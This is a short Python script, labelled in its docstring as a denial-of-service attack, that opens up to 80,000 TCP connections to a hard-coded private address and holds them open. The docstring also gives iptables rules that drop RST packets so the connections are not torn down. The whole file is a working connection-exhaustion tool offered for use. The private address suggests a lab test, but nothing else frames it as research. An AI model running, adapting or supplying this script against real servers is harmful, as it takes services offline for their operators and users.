"""
DOS-Attack: Create maximum TCP connections.

Drop outgoing RST:
iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP
iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP
iptables -I INPUT -p tcp --tcp-flags ALL RST -j DROP
"""
import socket
import time


#TCP_IP = "192.168.10.100"
TCP_IP = "192.168.122.60"
#TCP_PORT = 21
TCP_PORT = 1534
BUFFER_SIZE = 1024

print("starting...")
sockets = []

for cnt in range(80000):
	if cnt % 1000 == 0:
		print("%d" % cnt)

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	except OSError:
		print("got too many open files error: check/increase via 'ulimit -n' 'ulimit -n XXXX'")
		break
	s.connect((TCP_IP, TCP_PORT))
	sockets.append(s)
	#s.close()
	#time.sleep(0.1)
	#print("OK")
	#print(".")

print("finished")
time.sleep(999)
